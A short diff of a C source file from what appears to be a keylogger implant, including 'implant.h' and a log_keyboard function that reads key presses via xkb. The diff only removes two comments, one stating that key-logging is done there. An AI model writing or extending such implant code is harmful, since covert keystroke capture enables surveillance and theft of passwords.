@@ -1,9 +1,4 @@
 
-/*
-   key-logging is done here......yeah
-*/
-
-
 #include "implant.h"
 #include <alloca.h>
 #include <bits/types/struct_timeval.h>
@@ -86,7 +81,6 @@ static int log_keyboard(int fd, struct xkb_state *state, char *key_desc_ptr[STRI
         xkb_keysym_get_name(keysym, *key_desc_ptr, STRING_BUFFER_SIZE);
 
 #ifdef DEBUG
-        /* tracing this in stdout so that errors can be cleanly sent to a file */
         printf("[+] Key pressed: %s\n", *key_desc_ptr);
 #endif
 
